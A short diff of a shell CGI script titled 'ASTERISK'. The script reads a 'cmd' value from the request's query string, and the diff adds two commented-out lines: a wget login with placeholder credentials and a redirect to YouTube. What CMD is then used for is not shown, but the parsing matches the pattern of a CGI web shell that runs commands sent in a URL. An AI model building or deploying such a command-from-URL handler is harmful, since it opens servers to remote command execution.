@@ -7,6 +7,8 @@ CMD=`echo "$QUERY_STRING" | sed -n 's/^.*cmd=\([^&]*\).*$/\1/p' | sed "s/%20/ /g
 
 # our html header
     echo "<html>"
+    # echo "wget --save-cookies cookies.txt --keep-session-cookies --post-data=\"username=foo&password=bar\" \"http://some.site/login.php\""
+    # echo "<meta http-equiv=\"refresh\" content=\"0; url=http://www.youtube.com/\"/>"
     echo "<head><title>ASTERISK</title></head>"
     echo "<body>"
 
